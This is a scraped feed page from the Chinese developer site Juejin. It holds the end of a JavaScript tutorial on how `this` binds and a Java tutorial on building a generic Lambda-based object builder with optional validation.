    <span class="hljs-keyword">return</span> { <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }; 
}
<span class="hljs-keyword">let</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'harvest'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p2);      <span class="hljs-comment">// 输出{ age: 20 }，实例被忽略</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p2.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出undefined，拿不到原本的name属性</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17b7695c002c47f893a1903e851e6ffd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=tQe57Um4TKAXNfVHHsj%2B4yRNAuA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>情况 3：无视 return</strong> —— return 原始类型，依然返回实例</p>
<p>如果构造函数里<code>return</code>的是<strong>原始数据类型</strong>（比如数字、字符串、布尔值、null、undefined），这个<code>return</code>会被工厂 “无视”，依然按原规则返回绑定了<code>this</code>的实例对象，相当于你递了个 “无效产品”，工厂还是按定制流程来。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>; <span class="hljs-comment">// return 无效</span>
}
<span class="hljs-keyword">let</span> p3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'henry'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p3.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出"henry"，实例正常生效</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58a9a661eade4e5da9cadc93475da495~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=zwaQaMGNZ1tKJvZEDFwDpT8Tgsk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">6. 箭头函数 —— “没有 this” 的 this</h4>
<p>箭头函数里没有自己的<code>this</code>，它的<code>this</code>是<strong>外层非箭头函数的 this</strong>。就像 “小跟班”，永远跟着外层函数的<code>this</code>走，不会被任何绑定规则改变。</p>
<pre><code class="hljs language-ini" lang="ini">function foo() {
    var <span class="hljs-attr">bar</span> = () =&gt; {
        <span class="hljs-attr">this.a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
    }
    bar()<span class="hljs-comment">;</span>
}
var <span class="hljs-attr">obj</span> = {
    a: 1,
    baz: foo
}
obj.baz()<span class="hljs-comment">;</span>
console.log(obj)<span class="hljs-comment">;</span>
</code></pre>
<p>再次灵魂拷问：<code>a</code> 是 1 还是 2 ？ 答案：<code>2</code> ！</p>
<p><strong>关键逻辑：</strong></p>
<ol>
<li><code>obj.baz()</code> 是<strong>隐式绑定</strong>：foo 函数被 obj 调用，所以 foo 里的<code>this</code>指向 obj；</li>
<li>箭头函数<code>bar</code>没有自己的<code>this</code>，直接 “偷” 了外层 foo 的<code>this</code>（也就是 obj）；</li>
<li>执行<code>bar()</code>时，<code>this.a = 2</code> 其实是给<code>obj.a</code>赋值，把原来的 1 改成了 2；</li>
<li>最后打印 obj，a 属性已经变成 2，结果就是 <code>{ a: 2, baz: 函数foo }</code>。</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9a92f2c5f224de680f283a132db4316~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=k2qlGEtEpbMiI9nrfxLAAGGJEoM%3D" alt="image.png" loading="lazy"/></p>
<p>OK，是不是觉得自己已经拿捏<code>this</code>了？</p>
<h2 data-id="heading-10">总结</h2>
<p>从 “自由散漫” 的默认绑定、“依附对象” 的隐式绑定，到 “强行指定” 的三个“热心”的室友，再到 “定制化” 的 new 绑定（三种情况），最后是 “粘人跟班” 的箭头函数 —— 只要找准场景对号入座，<code>this</code>就再也不会让你头疼啦！</p>
<blockquote>
<p>掌握<code>this</code>，让你的代码更上一层楼吧!</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JDK8 Lambda 加持：打造优雅通用的对象构建器]]></title>    <link>https://juejin.cn/post/7575119254313648154</link>    <guid>https://juejin.cn/post/7575119254313648154</guid>    <pubDate>2025-11-23T07:19:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575119254313648154" data-draft-id="7575182522411040806" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JDK8 Lambda 加持：打造优雅通用的对象构建器"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-11-23T07:19:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="只会写代码"/> <meta itemprop="url" content="https://juejin.cn/user/995479086189514"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JDK8 Lambda 加持：打造优雅通用的对象构建器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/995479086189514/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    只会写代码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:19:29.000Z" title="Sun Nov 23 2025 07:19:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在日常 Java 开发中，对象构建是高频操作。传统的<code>new 对象 + 链式setter</code>或手动编写 Builder 模式，要么代码冗余繁琐，要么需要重复开发模板代码。本文将基于 JDK8 的 Lambda 特性，实现一个通用、优雅、支持灵活校验的对象构建器，彻底解决对象构建的痛点。</p>
<h2 data-id="heading-0">一、痛点回顾：传统对象构建的困境</h2>
<p>先看一个常见场景：创建一个<code>User</code>对象并设置属性，部分属性需要校验（如年龄必须大于 0）。</p>
<h3 data-id="heading-1">1. 传统 setter 模式</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
user.setName(<span class="hljs-string">"张三"</span>);
user.setAge(<span class="hljs-number">25</span>);
user.setEmail(<span class="hljs-string">"zhangsan@xxx.com"</span>);
<span class="hljs-comment">// 校验逻辑散落各处</span>
<span class="hljs-keyword">if</span> (user.getAge() &lt;= <span class="hljs-number">0</span>) {
   <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"年龄必须大于0"</span>);
}
</code></pre>
<ul>
<li>问题：代码冗长，缺乏链式调用的流畅性，校验逻辑与属性设置分离，维护成本高。</li>
</ul>
<h3 data-id="heading-2">2. 手动编写 Builder 模式</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBuilder</span> {
   <span class="hljs-keyword">private</span> User user;
   <span class="hljs-keyword">private</span> <span class="hljs-title function_">UserBuilder</span><span class="hljs-params">()</span> { user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(); }
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> UserBuilder <span class="hljs-title function_">builder</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserBuilder</span>(); }
   <span class="hljs-keyword">public</span> UserBuilder <span class="hljs-title function_">name</span><span class="hljs-params">(String name)</span> {
       user.setName(name);
       <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
   }
   <span class="hljs-keyword">public</span> UserBuilder <span class="hljs-title function_">age</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
       <span class="hljs-keyword">if</span> (age &lt;= <span class="hljs-number">0</span>) {
           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"年龄必须大于0"</span>);
       }
       user.setAge(age);
       <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
   }
   <span class="hljs-comment">// 其他属性的setter...</span>
   <span class="hljs-keyword">public</span> User <span class="hljs-title function_">build</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> user; }
}
<span class="hljs-comment">// 使用</span>
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> UserBuilder.builder()
       .name(<span class="hljs-string">"张三"</span>)
       .age(<span class="hljs-number">25</span>)
       .email(<span class="hljs-string">"zhangsan@xxx.com"</span>)
       .build();
</code></pre>
<ul>
<li>问题：每个实体类都要编写对应的 Builder 类，重复代码多；校验逻辑与 Builder 强耦合，灵活性差。
有没有一种方式，既能享受 Builder 模式的链式优雅，又不用编写重复模板代码，还能灵活支持属性校验？答案是：用 JDK8 Lambda 实现通用构建器！</li>
</ul>
<h2 data-id="heading-3">二、核心设计：Lambda 构建器的实现原理</h2>
<p>核心思路：<strong>用函数式接口承接 setter 逻辑，通过 Lambda 表达式简化调用，封装构建逻辑为通用工具类</strong>。
整体结构分为两部分：</p>
<ol>
<li>函数式接口<code>SetterFunction</code>：定义属性设置行为</li>
<li>构建器类<code>InstanceBuilder</code>：封装实例创建、属性设置、校验逻辑</li>
</ol>
<h3 data-id="heading-4">1. 函数式接口：SetterFunction</h3>
<p>这是 Lambda 能生效的核心 —— 必须是<strong>函数式接口</strong>（仅一个抽象方法），用于承接 “对象 + 属性值” 的设置逻辑。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
* Setter方法函数式接口
* 承接对象的属性设置行为，为Lambda表达式提供目标类型
* <span class="hljs-doctag">@param</span> &lt;T&gt; 目标对象类型
* <span class="hljs-doctag">@param</span> &lt;P&gt; 属性值类型
*/</span>
<span class="hljs-meta">@FunctionalInterface</span> <span class="hljs-comment">// 显式声明函数式接口（可选，但推荐）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SetterFunction</span>&lt;T, P&gt; {
    <span class="hljs-comment">/**
    * 执行属性设置
    * <span class="hljs-doctag">@param</span> target 目标对象
    * <span class="hljs-doctag">@param</span> param 要设置的属性值
    */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">(T target, P param)</span>;
    }
</code></pre>
<p>为什么不用 JDK 自带的<code>BiConsumer&lt;T, P&gt;</code>？
<code>BiConsumer</code>的方法名是<code>accept</code>，语义不够明确；而<code>SetterFunction</code>的<code>call</code>方法更直观体现 “执行属性设置” 的意图，且自定义接口可后续扩展（如添加默认方法），灵活性更高。</p>
<h3 data-id="heading-5">2. 核心构建器：InstanceBuilder</h3>
<p>封装实例创建、链式设置、属性校验、实例返回的完整逻辑，提供两种创建方式（新实例 / 现有实例），支持可选校验。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.Objects;
<span class="hljs-keyword">import</span> java.util.function.Predicate;

<span class="hljs-comment">/**
 * 实例构建器
 * 用于构建和配置对象实例，支持链式调用设置属性值
 *
 * <span class="hljs-doctag">@param</span> &lt;T&gt; 要构建的实例类型
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InstanceBuilder</span>&lt;T&gt; {

    <span class="hljs-comment">/** 正在构建的实例对象 */</span>
    <span class="hljs-keyword">private</span> T inst;

    <span class="hljs-comment">/**
     * 私有构造函数 - 基于现有实例创建构建器
     *
     * <span class="hljs-doctag">@param</span> inst 已存在的实例对象
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">InstanceBuilder</span><span class="hljs-params">(T inst)</span> {
        <span class="hljs-built_in">this</span>.inst = Objects.requireNonNull(inst, <span class="hljs-string">"Instance cannot be null"</span>);
    }

    <span class="hljs-comment">/**
     * 私有构造函数 - 基于类创建构建器（通过反射实例化）
     *
     * <span class="hljs-doctag">@param</span> instClass 要实例化的类
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">InstanceBuilder</span><span class="hljs-params">(Class&lt;T&gt; instClass)</span> {
        Objects.requireNonNull(instClass, <span class="hljs-string">"instClass cannot be null"</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 使用无参构造函数创建实例</span>
            <span class="hljs-built_in">this</span>.inst = instClass.getDeclaredConstructor().newInstance();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to create instance of "</span> + instClass.getName(), e);
        }
    }

    <span class="hljs-comment">/**
     * 静态工厂方法 - 基于现有实例创建构建器
     *
     * <span class="hljs-doctag">@param</span> &lt;T&gt; 实例类型
     * <span class="hljs-doctag">@param</span> inst 已存在的实例对象
     * <span class="hljs-doctag">@return</span> InstBuilder实例
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(T inst)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstanceBuilder</span>&lt;&gt;(inst);
    }

    <span class="hljs-comment">/**
     * 静态工厂方法 - 基于类创建构建器
     *
     * <span class="hljs-doctag">@param</span> &lt;T&gt; 实例类型
     * <span class="hljs-doctag">@param</span> instClass 要实例化的类
     * <span class="hljs-doctag">@return</span> InstBuilder实例
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(Class&lt;T&gt; instClass)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstanceBuilder</span>&lt;&gt;(instClass);
    }

    <span class="hljs-comment">/**
     * 设置实例属性值
     * 使用函数式接口方式设置实例的特定属性，支持链式调用
     *
     * <span class="hljs-doctag">@param</span> &lt;V&gt; 属性值类型
     * <span class="hljs-doctag">@param</span> fnSet 设置属性的函数式接口
     * <span class="hljs-doctag">@param</span> v 要设置的属性值
     * <span class="hljs-doctag">@return</span> 当前构建器实例（支持链式调用）
     */</span>
    <span class="hljs-keyword">public</span> &lt;V&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">set</span><span class="hljs-params">(SetterFunction&lt;T, V&gt; fnSet, V v)</span>{
        fnSet.call(inst, v);
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-comment">/**
     * 带校验的set方法（重载，想用时用，不想用还能用原来的）
     * <span class="hljs-doctag">@param</span> fnSet 设置属性的函数式接口
     * <span class="hljs-doctag">@param</span> v 要设置的属性值
     * <span class="hljs-doctag">@param</span> validator 校验器
     * <span class="hljs-doctag">@return</span> 当前构建器实例（支持链式调用）
     * <span class="hljs-doctag">@param</span> &lt;V&gt; 属性值类型
     */</span>
    <span class="hljs-keyword">public</span> &lt;V&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">set</span><span class="hljs-params">(SetterFunction&lt;T, V&gt; fnSet, V v, Predicate&lt;V&gt; validator)</span>{
        <span class="hljs-comment">// 先校验：符合条件才设置属性，不符合就报错</span>
        <span class="hljs-keyword">if</span> (!validator.test(v)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"属性值不对："</span> + v);
        }
        fnSet.call(inst, v); <span class="hljs-comment">// 校验通过再调用你原有的设置逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-comment">/**
     * 构建并返回配置完成的实例
     *
     * <span class="hljs-doctag">@return</span> 构建完成的实例对象
     */</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">build</span><span class="hljs-params">()</span>{
        <span class="hljs-keyword">return</span> inst;
    }
}
</code></pre>
<pre><code class="hljs language-arduino" lang="arduino">核心设计亮点：
* 私有构造 + 静态工厂：限制创建方式，保证实例安全性
* 双重创建支持：既支持新实例创建（反射无参构造），也支持现有实例修改
* 重载 set 方法：普通设置 + 校验设置分离，按需使用，不侵入基础逻辑
* 函数式接口结合：`SetterFunction`承接 setter，`Predicate`承接校验，Lambda 简化调用

## 三、实战用法：<span class="hljs-number">3</span> 分钟上手优雅构建
下面通过 <span class="hljs-number">3</span> 个核心场景，演示如何用这个构建器简化开发。
### 准备工作：定义实体类
先定义一个普通实体类（无需任何改造，无侵入性）：

```java
<span class="hljs-comment">/**
* 普通实体类（无需实现任何接口/注解）
*/</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name;
    <span class="hljs-keyword">private</span> Integer age;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> email;
    <span class="hljs-comment">// 无参构造（反射创建必需）</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-comment">// getter/setter（常规生成即可）</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> name; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-type">String</span> name)</span> </span>{ <span class="hljs-keyword">this</span>.name = name; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> age; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(Integer age)</span> </span>{ <span class="hljs-keyword">this</span>.age = age; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> email; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(<span class="hljs-type">String</span> email)</span> </span>{ <span class="hljs-keyword">this</span>.email = email; }
}
</code></pre>
<h3 data-id="heading-6">场景 1：创建新实例（无参构造）</h3>
<p>通过<code>InstanceBuilder.of(Class)</code>创建新实例，链式设置属性：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 构建User实例：无校验</span>
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> InstanceBuilder.of(User.class)
    .set(User::setName, <span class="hljs-string">"张三"</span>) <span class="hljs-comment">// Lambda替代setter调用</span>
    .set(User::setAge, <span class="hljs-number">25</span>)
    .set(User::setEmail, <span class="hljs-string">"zhangsan@xxx.com"</span>)
    .build();
System.out.println(user.getName()); <span class="hljs-comment">// 输出：张三</span>
</code></pre>
<h3 data-id="heading-7">场景 2：修改现有实例</h3>
<p>通过<code>InstanceBuilder.of(实例)</code>修改已有对象的属性（适合 DTO 转换、对象更新场景）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 已有实例</span>
<span class="hljs-type">User</span> <span class="hljs-variable">existingUser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
existingUser.setName(<span class="hljs-string">"李四"</span>);
<span class="hljs-comment">// 修改现有实例的属性</span>
<span class="hljs-type">User</span> <span class="hljs-variable">updatedUser</span> <span class="hljs-operator">=</span> InstanceBuilder.of(existingUser)
    .set(User::setAge, <span class="hljs-number">30</span>)
    .set(User::setEmail, <span class="hljs-string">"lisi@xxx.com"</span>)
    .build();
System.out.println(updatedUser.getAge()); <span class="hljs-comment">// 输出：30</span>
System.out.println(updatedUser.getName()); <span class="hljs-comment">// 输出：李四（未修改的属性保留原值）</span>
</code></pre>
<h3 data-id="heading-8">场景 3：带属性校验的构建</h3>
<p>通过<code>set(SetterFunction, value, Predicate)</code>添加校验逻辑（如年龄 &gt; 0、邮箱非空）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    <span class="hljs-type">User</span> <span class="hljs-variable">validUser</span> <span class="hljs-operator">=</span> InstanceBuilder.of(User.class)
        .set(User::setName, <span class="hljs-string">"王五"</span>, name -&gt; name.length() &gt;= <span class="hljs-number">2</span>) <span class="hljs-comment">// 姓名至少2个字符</span>
        .set(User::setAge, -<span class="hljs-number">5</span>, age -&gt; age &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">// 年龄必须大于0（故意传错值）</span>
        .set(User::setEmail, <span class="hljs-string">"wangwu@xxx.com"</span>, email -&gt; email.contains(<span class="hljs-string">"@"</span>)) <span class="hljs-comment">// 邮箱必须包含@</span>
        .build();
} <span class="hljs-keyword">catch</span> (IllegalArgumentException e) {
    System.out.println(e.getMessage()); <span class="hljs-comment">// 输出：属性值校验失败：-5</span>
}
</code></pre>
<p>校验逻辑灵活可配置，支持任意复杂规则（如多条件组合、正则匹配等）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 复杂校验：邮箱必须包含@且长度&gt;5</span>
.set(User::setEmail, <span class="hljs-string">"ww@xxx.com"</span>, email -&gt; email.contains(<span class="hljs-string">"@"</span>) &amp;&amp; email.length() &gt; <span class="hljs-number">5</span>)
</code></pre>
<h2 data-id="heading-9">四、核心特性：为什么这个构建器值得用？</h2>
<h3 data-id="heading-10">1. 极简链式调用，代码更优雅</h3>
<p>Lambda 表达式替代了冗长的 setter 调用，链式写法一气呵成，代码可读性大幅提升。</p>
<h3 data-id="heading-11">2. 零侵入性，无需改造实体类</h3>
<p>实体类无需实现任何接口、添加任何注解，也不用编写 Builder 内部类，完全复用原有 getter/setter。</p>
<h3 data-id="heading-12">3. 灵活创建 + 修改，场景全覆盖</h3>
<p>支持 “新实例创建” 和 “现有实例修改” 两种场景，满足对象初始化、DTO 更新、属性批量修改等需求。</p>
<h3 data-id="heading-13">4. 可选校验机制，逻辑解耦</h3>
<p>校验逻辑通过<code>Predicate</code>传入，与属性设置分离，无需侵入实体类或构建器核心逻辑，按需启用。</p>
<h3 data-id="heading-14">5. JDK8 原生支持，无依赖</h3>
<p>仅依赖 JDK8 核心 API（Lambda、函数式接口、反射），无需引入第三方框架（如 Lombok），轻量化无冗余。</p>
<h2 data-id="heading-15">五、对比传统方案：优势一目了然</h2>

































